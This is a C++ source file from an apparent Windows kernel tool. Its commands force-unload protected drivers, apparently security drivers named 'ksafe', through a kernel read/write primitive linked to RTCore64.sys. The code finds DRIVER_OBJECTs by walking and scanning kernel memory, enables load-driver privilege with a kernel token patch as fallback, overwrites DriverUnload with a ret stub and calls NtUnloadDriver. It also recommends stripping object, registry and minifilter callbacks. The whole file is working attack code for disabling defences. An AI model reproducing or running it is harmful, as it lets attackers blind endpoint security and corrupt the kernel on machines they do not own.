// cmd_unload.cpp — /drv-unload <driver_name> <drvobj_va>
//
// Force-unload a NOT_STOPPABLE kernel driver by:
//   1. Patching DriverUnload (DRIVER_OBJECT+0x68) to a safe ret stub
//      (found by scanning ntoskrnl .text for xor eax,eax+ret)
//   2. Calling ControlService(SERVICE_CONTROL_STOP) via SCM
//
// Get <drvobj_va> from WinDbg:  !object \Driver\<name>
//
// ppm-engine v0.2.1 verification (2026-04-11):
//   ALL 9 ksafe drivers confirmed to have NO DriverUnload export.
//   RTCore64.sys also has no DriverUnload.
//   -> /force-stop with ret stub patch is the only viable unload path.
//
// DRIVER_OBJECT layout (x64 Win10):
//   +0x000 Type/Size     : 0x01500004
//   +0x008 DeviceObject  : ptr
//   +0x010 Flags         : ULONG
//   +0x018 DriverStart   : ptr
//   +0x020 DriverSize    : ULONG
//   +0x028 DriverSection : ptr (→ KLDR_DATA_TABLE_ENTRY)
//   +0x030 DriverExtension: ptr
//   +0x038 DriverName    : UNICODE_STRING
//   +0x058 DriverInit    : ptr  (entry point)
//   +0x068 DriverUnload  : ptr  ← NULL = NOT_STOPPABLE
//   +0x070 MajorFunction[0..27]

#define NOMINMAX
#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include <cstring>
#include <vector>
#include <Psapi.h>

#include "kutil.h"
#include "driver/IDriverBackend.h"
#include "globals.h"
#include "ansi.h"
#include "commands.h"

#define DRVOBJ_DRIVER_UNLOAD  0x068

// Scan ntoskrnl on-disk .text for  xor eax,eax ; ret  (33 C0 C3).
// Returns kernel VA of the pattern, or 0 on failure.
static DWORD64 FindRetStub() {
    LPVOID d[1]; DWORD cb;
    if (!EnumDeviceDrivers(d, sizeof(d), &cb)) return 0;
    DWORD64 kBase = (DWORD64)d[0];

    WCHAR drvPath[MAX_PATH], filePath[MAX_PATH];
    if (!GetDeviceDriverFileNameW(d[0], drvPath, MAX_PATH)) return 0;
    if (_wcsnicmp(drvPath, L"\\SystemRoot\\", 12) == 0) {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\%s", winDir, drvPath + 12);
    } else {
        WCHAR winDir[MAX_PATH]; GetWindowsDirectoryW(winDir, MAX_PATH);
        swprintf_s(filePath, MAX_PATH, L"%s\\System32\\ntoskrnl.exe", winDir);
    }

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd; bool ok = ReadFile(hf, buf.data(), sz, &rd, NULL) && rd == sz;
    CloseHandle(hf);
    if (!ok) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD nSec = nt->FileHeader.NumberOfSections;
    DWORD textFOA = 0, textRVA = 0, textSz = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".text") == 0) {
            textFOA = sec[i].PointerToRawData;
            textRVA = sec[i].VirtualAddress;
            textSz  = sec[i].SizeOfRawData;
            break;
        }
    }
    if (!textFOA) return 0;

    const BYTE* p = buf.data();

    // Primary: xor eax,eax (33 C0) + ret (C3) — clean zero-return stub
    for (DWORD i = textFOA; i + 2 < textFOA + textSz; i++) {
        if (p[i] == 0x33 && p[i+1] == 0xC0 && p[i+2] == 0xC3)
            return kBase + textRVA + (i - textFOA);
    }
    // Fallback: bare ret
    for (DWORD i = textFOA; i < textFOA + textSz; i++) {
        if (p[i] == 0xC3)
            return kBase + textRVA + (i - textFOA);
    }
    return 0;
}

// ─── DRIVER_OBJECT auto-discovery ────────────────────────────────────────────

// Get module base address by matching driver filename against service name.
static DWORD64 GetModuleBaseByServiceName(const char* svcName) {
    DWORD cb = 0;
    EnumDeviceDrivers(nullptr, 0, &cb);
    if (!cb) return 0;
    std::vector<LPVOID> dvrs(cb / sizeof(LPVOID));
    if (!EnumDeviceDrivers(dvrs.data(), cb, &cb)) return 0;

    for (auto d : dvrs) {
        WCHAR wname[MAX_PATH] = {};
        GetDeviceDriverBaseNameW(d, wname, MAX_PATH);
        // Strip .sys extension for comparison
        char narrow[MAX_PATH] = {};
        WideCharToMultiByte(CP_UTF8, 0, wname, -1, narrow, MAX_PATH, nullptr, nullptr);
        char* dot = strrchr(narrow, '.');
        if (dot) *dot = '\0';
        if (_stricmp(narrow, svcName) == 0)
            return (DWORD64)d;
    }
    return 0;
}

// Walk PsLoadedModuleList in the kernel to find the KLDR_DATA_TABLE_ENTRY
// for the given module base. Returns kernel VA of KLDR entry, or 0 on failure.
//
// KLDR_DATA_TABLE_ENTRY layout (Win10 22H2 x64):
//   +0x000  InLoadOrderLinks (LIST_ENTRY: Flink at +0, Blink at +8)
//   +0x028  DllBase (Ptr64)
static DWORD64 FindKldrByModuleBase(DWORD64 moduleBase) {
    DWORD64 pslVA = KUtil::KernelExport("PsLoadedModuleList");
    if (!pslVA) { printf("[!] PsLoadedModuleList not found\n"); return 0; }

    DWORD64 head = pslVA;
    DWORD64 curr = g_drv->Rd64(head);   // Flink of list head
    for (int i = 0; i < 512 && curr && curr != head; i++) {
        DWORD64 dllBase = g_drv->Rd64(curr + 0x028);
        if (dllBase == moduleBase) return curr;
        curr = g_drv->Rd64(curr);        // Next Flink
    }
    return 0;
}

// Scan ±RANGE bytes around kldrAddr for a DRIVER_OBJECT matching moduleBase.
// Uses a 3-way verification: signature, DriverStart, DriverSection.
// Safe because KLDR is in NonPagedPool and ±range stays in pool region.
static DWORD64 ScanForDriverObject(DWORD64 kldrAddr, DWORD64 moduleBase) {
    const DWORD64 RANGE = 0x8000;   // ±32 KB
    DWORD64 start = kldrAddr - RANGE;
    DWORD64 end   = kldrAddr + RANGE;

    for (DWORD64 a = start; a < end; a += 8) {
        if (g_drv->Rd32(a) != 0x01500004) continue;           // Type/Size check
        if (g_drv->Rd64(a + 0x018) != moduleBase) continue;   // DriverStart
        if (g_drv->Rd64(a + 0x028) != kldrAddr)  continue;   // DriverSection
        return a;
    }
    return 0;
}

// Fallback: scan the driver's .data section in kernel memory for a stored
// DRIVER_OBJECT pointer (DriverEntry saves the PDRIVER_OBJECT arg in a global).
static DWORD64 FindDriverObjectFromDataSection(DWORD64 moduleBase,
                                                const char* svcName) {
    // Open the on-disk image to find .data section bounds
    WCHAR filePath[MAX_PATH];
    // Try System32\drivers\ path first, fall back to full path from SCM
    swprintf_s(filePath, MAX_PATH,
        L"C:\\Windows\\System32\\drivers\\%hs.sys", svcName);

    HANDLE hf = CreateFileW(filePath, GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) return 0;
    DWORD sz = GetFileSize(hf, NULL);
    std::vector<BYTE> buf(sz);
    DWORD rd = 0;
    ReadFile(hf, buf.data(), sz, &rd, NULL);
    CloseHandle(hf);
    if (rd != sz) return 0;

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(buf.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;
    auto* nt  = reinterpret_cast<IMAGE_NT_HEADERS64*>(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;
    auto* sec = IMAGE_FIRST_SECTION(nt);
    WORD nSec = nt->FileHeader.NumberOfSections;

    DWORD dataVA = 0, dataSize = 0;
    for (WORD i = 0; i < nSec; i++) {
        char name[9] = {}; memcpy(name, sec[i].Name, 8);
        if (strcmp(name, ".data") == 0) {
            dataVA   = sec[i].VirtualAddress;
            dataSize = sec[i].Misc.VirtualSize;
            if (!dataSize) dataSize = sec[i].SizeOfRawData;
            if (!dataSize && i + 1 < nSec)
                dataSize = sec[i+1].VirtualAddress - dataVA;
            if (!dataSize) dataSize = 0x10000;
            break;
        }
    }
    if (!dataVA) return 0;

    DWORD64 dataStart = moduleBase + dataVA;
    DWORD64 dataEnd   = dataStart + dataSize;
    printf("[*] Scanning .data [0x%016llX – 0x%016llX] for DRIVER_OBJECT ptr...\n",
           dataStart, dataEnd);

    for (DWORD64 a = dataStart; a < dataEnd; a += 8) {
        DWORD64 val = g_drv->Rd64(a);
        if (!g_drv->IsKernelVA(val)) continue;
        if (g_drv->Rd32(val)          != 0x01500004) continue;  // signature
        if (g_drv->Rd64(val + 0x018)  != moduleBase) continue;  // DriverStart
        printf("[+] Found at .data+0x%llX → DRIVER_OBJECT 0x%016llX\n",
               a - dataStart, val);
        return val;
    }
    return 0;
}

// Combined: service name → DRIVER_OBJECT VA (or 0).
static DWORD64 AutoFindDriverObject(const char* svcName) {
    DWORD64 modBase = GetModuleBaseByServiceName(svcName);
    if (!modBase) { printf("[!] Module base not found for \"%s\"\n", svcName); return 0; }
    printf("[*] Module base: 0x%016llX\n", modBase);

    // Path 1: KLDR-based scan (works for non-DKOM drivers)
    DWORD64 kldr = FindKldrByModuleBase(modBase);
    if (kldr) {
        printf("[*] KLDR entry:  0x%016llX\n", kldr);
        printf("[*] Scanning ±32KB around KLDR for DRIVER_OBJECT...\n");
        DWORD64 drvObj = ScanForDriverObject(kldr, modBase);
        if (drvObj) { printf("[+] DRIVER_OBJECT: 0x%016llX\n", drvObj); return drvObj; }
        printf("[!] Not found near KLDR\n");
    } else {
        printf("[!] KLDR not in PsLoadedModuleList (DKOM-hidden) — trying .data scan\n");
    }

    // Path 2: scan driver's .data section for stored DRIVER_OBJECT pointer
    DWORD64 drvObj = FindDriverObjectFromDataSection(modBase, svcName);
    if (drvObj) return drvObj;

    printf("[!] Auto-discovery failed.\n"
           "    Use /drv-unload %s <drvobj_va> with VA from WinDbg: "
           "!object \\Driver\\%s\n", svcName, svcName);
    return 0;
}

// ─── /force-stop <name> ───────────────────────────────────────────────────────
// Force-stop a driver service by calling NtUnloadDriver directly.
// No DRIVER_OBJECT VA needed — the kernel resolves it from the registry path.
//
// Bypasses the SCM ControlService check that blocks services marked
// NOT_STOPPABLE (sc stop → error 1052 / ERROR_INVALID_SERVICE_CONTROL).
//
// If NtUnloadDriver fails with STATUS_PLUGPLAY_NO_DEVICE the driver has no
// DriverUnload routine; use /drv-unload <name> <drvobj_va> to patch one in.

static bool EnablePrivilege(const wchar_t* privName) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp{};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, privName, &tp.Privileges[0].Luid)) {
        CloseHandle(hToken); return false;
    }
    bool ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp),
                                     NULL, NULL) &&
              GetLastError() == ERROR_SUCCESS;
    CloseHandle(hToken);
    return ok;
}

void CmdForceStop(const char* svcName) {
    printf("[*] /force-stop  service=%s\n\n", svcName);

    // Try user-mode privilege enable first; fall back to kernel patch via /enable-priv
    if (EnablePrivilege(L"SeLoadDriverPrivilege"))
        printf("[+] SeLoadDriverPrivilege enabled (user-mode)\n");
    else {
        printf("[*] User-mode AdjustTokenPrivileges failed — using kernel token patch\n");
        CmdEnablePriv("SeLoadDriverPrivilege");
    }

    typedef NTSTATUS (NTAPI *PfnNtUnloadDriver)(PUNICODE_STRING);
    auto pfn = (PfnNtUnloadDriver)
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtUnloadDriver");
    if (!pfn) { printf("[!] NtUnloadDriver not found in ntdll\n"); return; }

    wchar_t regPath[256];
    swprintf_s(regPath, 256,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%hs", svcName);

    UNICODE_STRING uPath{};
    uPath.Buffer        = regPath;
    uPath.Length        = (USHORT)(wcslen(regPath) * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    printf("[*] NtUnloadDriver(\"%ls\") ...\n", regPath);
    NTSTATUS st = pfn(&uPath);

    if (st == 0) {
        printf("[+] Driver unloaded successfully\n");
        return;
    }

    printf("[!] NtUnloadDriver failed: 0x%08X", (DWORD)st);

    // For access denied there's nothing more we can do
    if ((DWORD)st == 0xC0000022) {
        printf(" STATUS_ACCESS_DENIED\n");
        return;
    }
    if ((DWORD)st == 0xC0000034) {
        printf(" STATUS_OBJECT_NAME_NOT_FOUND — service not in registry\n");
        return;
    }

    // 0xC000010E = no DriverUnload  /  0xC0000010 = DriverUnload blocked unload
    // Either way: auto-find DRIVER_OBJECT, patch DriverUnload to ret stub, retry.
    if ((DWORD)st == 0xC000010E)
        printf(" STATUS_PLUGPLAY_NO_DEVICE — no DriverUnload, will patch one\n");
    else if ((DWORD)st == 0xC0000010)
        printf(" STATUS_INVALID_DEVICE_REQUEST — DriverUnload blocked, will patch\n");
    else
        printf(" — will attempt DriverUnload patch anyway\n");

    printf("[*] Auto-locating DRIVER_OBJECT...\n");
    DWORD64 drvObjVA = AutoFindDriverObject(svcName);
    if (!drvObjVA) {
        printf("[!] Auto-discovery failed.\n"
               "    Use /drv-unload %s <drvobj_va> with VA from WinDbg: "
               "!object \\Driver\\%s\n", svcName, svcName);
        return;
    }

    // Validate signature
    if (g_drv->Rd32(drvObjVA) != 0x01500004) {
        printf("[!] Signature mismatch at discovered address — aborting\n");
        return;
    }

    // Patch DriverUnload to xor eax,eax; ret
    DWORD64 stub = FindRetStub();
    if (!stub) { printf("[!] ret stub not found in ntoskrnl\n"); return; }

    DWORD64 unloadSlot = drvObjVA + DRVOBJ_DRIVER_UNLOAD;
    DWORD64 origUnload = g_drv->Rd64(unloadSlot);
    g_drv->Wr64(unloadSlot, stub);
    printf("[+] DriverUnload patched: 0x%016llX → 0x%016llX\n", origUnload, stub);

    // Retry NtUnloadDriver
    printf("[*] Retrying NtUnloadDriver...\n");
    st = pfn(&uPath);
    if (st == 0) {
        printf("[+] Driver unloaded successfully\n");
    } else {
        printf("[!] Still failed: 0x%08X — driver may have self-protection beyond DriverUnload\n",
               (DWORD)st);
        // Restore original DriverUnload to leave kernel in a clean state
        g_drv->Wr64(unloadSlot, origUnload);
        printf("[*] DriverUnload restored to 0x%016llX\n", origUnload);
    }
}

void CmdForceUnload(const char* drvName, DWORD64 drvObjVA) {
    printf("[*] /drv-unload  driver=%s  DRIVER_OBJECT=0x%016llX\n\n", drvName, drvObjVA);

    if (!g_drv->IsKernelVA(drvObjVA)) {
        printf("[!] DRIVER_OBJECT address is not a valid kernel VA\n");
        return;
    }

    // Pre-flight: check DeviceObject chain and warn about zombie risk
    {
        DWORD64 devObj = g_drv->Rd64(drvObjVA + 0x08);
        int devCount = 0;
        DWORD64 cur = devObj;
        while (g_drv->IsKernelVA(cur) && devCount < 32) {
            devCount++;
            cur = g_drv->Rd64(cur + 0x10); // NextDevice
        }
        if (devCount > 0) {
            printf("%s[!]%s WARNING: %d DeviceObject(s) still attached.\n"
                   "    The ret stub won't call IoDeleteDevice — driver may become ZOMBIE.\n"
                   "    Recommended: tear down references first:\n"
                   "      /disable <obcb_addr>           (remove ObCallback refs)\n"
                   "      /ndisable <notify_addr>        (remove notify refs)\n"
                   "      /flt-detach %s C:              (remove minifilter refs)\n"
                   "      /notify registry --kill %s     (remove CmCallback + unlock SCM)\n"
                   "    Then retry /drv-unload.\n\n",
                   A_YELLOW, A_RESET, devCount, drvName, drvName);
        }
    }

    // Validate signature: Type=4, Size=0x150 → first DWORD = 0x01500004
    DWORD sig = g_drv->Rd32(drvObjVA);
    if (sig != 0x01500004) {
        printf("[!] DRIVER_OBJECT signature mismatch: 0x%08X (expected 0x01500004)\n", sig);
        printf("    Wrong address?  Use WinDbg: !object \\Driver\\%s\n", drvName);
        return;
    }
    printf("[+] DRIVER_OBJECT signature OK (0x01500004)\n");

    // Read DriverUnload at +0x068
    DWORD64 unloadSlot = drvObjVA + DRVOBJ_DRIVER_UNLOAD;
    DWORD64 unloadFn   = g_drv->Rd64(unloadSlot);
    printf("[*] DriverUnload (+0x068) = 0x%016llX\n", unloadFn);

    if (unloadFn != 0 && g_drv->IsKernelVA(unloadFn)) {
        printf("[*] DriverUnload already set — skipping patch\n");
    } else {
        printf("[*] DriverUnload is NULL — patching with ret stub\n");

        DWORD64 stub = FindRetStub();
        if (!stub) {
            printf("[!] Could not locate ret stub in ntoskrnl .text\n");
            return;
        }
        printf("[+] ret stub found: 0x%016llX  (xor eax,eax; ret in ntoskrnl)\n", stub);

        g_drv->Wr64(unloadSlot, stub);
        DWORD64 verify = g_drv->Rd64(unloadSlot);
        if (verify != stub) {
            printf("[!] Write verification failed (read back 0x%016llX)\n", verify);
            return;
        }
        printf("[+] DriverUnload patched: NULL → 0x%016llX\n", stub);
    }

    // Call sc stop via SCM
    printf("[*] Sending SERVICE_CONTROL_STOP to \"%s\" ...\n", drvName);
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) { printf("[!] OpenSCManager: %lu\n", GetLastError()); return; }

    SC_HANDLE hSvc = OpenServiceA(hSCM, drvName,
                                   SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[!] OpenService: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return;
    }

    SERVICE_STATUS st{};
    if (ControlService(hSvc, SERVICE_CONTROL_STOP, &st)) {
        printf("[+] Stop accepted — dwCurrentState: %lu\n", st.dwCurrentState);
        if (st.dwCurrentState == SERVICE_STOPPED)
            printf("[+] Driver is STOPPED\n");
        else if (st.dwCurrentState == SERVICE_STOP_PENDING)
            printf("[+] Driver is STOP_PENDING (may need a moment)\n");
    } else {
        DWORD err = GetLastError();
        printf("[!] ControlService failed: %lu\n", err);
        if (err == ERROR_INVALID_SERVICE_CONTROL)
            printf("    Driver still refused stop — its handler may be blocking unload\n");
        else if (err == ERROR_SERVICE_NOT_ACTIVE)
            printf("    Service is already stopped\n");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
}
